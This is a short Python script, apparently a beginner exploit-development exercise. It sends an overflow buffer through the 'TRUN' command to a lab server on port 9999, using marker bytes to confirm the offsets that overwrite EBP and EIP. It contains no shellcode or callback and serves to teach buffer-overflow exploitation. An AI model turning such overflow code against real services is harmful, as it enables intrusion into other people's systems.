#!/usr/bin/python3
## remember, this is intended for beginners.
## so I wrote out some obvious(for some painfully obvious) things.
# there are loads of ways to write this.
import socket
IP="172.16.96.143" ; PRT=9999
vf=b"TRUN /.:/"
minimal_crash_value=1999
EDI_OFFSET=1999
EBP_OFFSET=EDI_OFFSET+4
EIP_OFFSET=EBP_OFFSET+4
#pkt = vf+b"\x41"*EBP_OFFSET
#pkt = vf+b"\x41"*EDI_OFFSET
##pkt = vf+b"\x41"*EIP_OFFSET # ; this overwrites EBP and EIP with b"\x41" 's.
#again there are loads of ways to write this
pkt = vf+((b"\x41"*(EDI_OFFSET))+b"\x42\x43\x44\x45"+b"\x46\x47\x48\x49")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PRT))
s.send(pkt)
s.close()
